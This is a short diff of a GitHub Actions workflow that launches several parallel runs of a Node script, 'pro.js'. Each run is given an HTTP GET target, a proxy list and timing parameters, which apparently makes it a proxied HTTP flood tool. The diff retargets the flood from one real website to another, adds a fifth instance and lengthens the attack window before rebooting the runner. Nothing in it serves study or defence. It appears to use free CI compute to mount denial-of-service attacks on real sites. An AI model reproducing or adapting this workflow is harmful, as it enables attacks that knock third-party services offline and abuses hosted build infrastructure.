@@ -20,8 +20,8 @@ jobs:
           npm i hpack
           chmod +x pro.js
           PIDS=()
-          for i in {1..4}; do
-            timeout 84 node pro.js GET https://hexbear.xyz/ 85 24 90 proxies.txt --full
+          for i in {1..5}; do
+            timeout 90 node pro.js GET https://1337.com.tr/ 90 24 90 proxies.txt --full
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 84
+        run: sleep 90
         
       - name: OK !
         run: sudo reboot
